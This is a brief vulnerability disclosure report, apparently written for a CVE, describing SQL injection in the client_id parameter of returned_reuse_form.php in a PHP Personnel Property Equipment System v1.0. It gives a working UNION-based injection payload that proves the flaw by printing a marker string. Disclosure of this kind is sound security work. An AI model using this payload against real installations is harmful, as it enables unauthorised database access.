# Personnel Property Equipment System v1.0 has SQL injection

BUG_Author: LeoZhangCA

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

Vulnerability File: /PPES/admin/returned_reuse_form.php

GET parameter "client_id" exists SQL injection vulnerability

Payload1: client_id=-1' union all select null,null,null,null,concat(0x5152535556,0x666768),null,null,null-- -&dep_id=17&item_id=27

The UNION query is successful, and the expected string "QRSVfgh" appears, which proves that there is a SQL injection vulnerability

![image](https://github.com/LeozhangCA/CVEReport/blob/main/picture/sql.png)
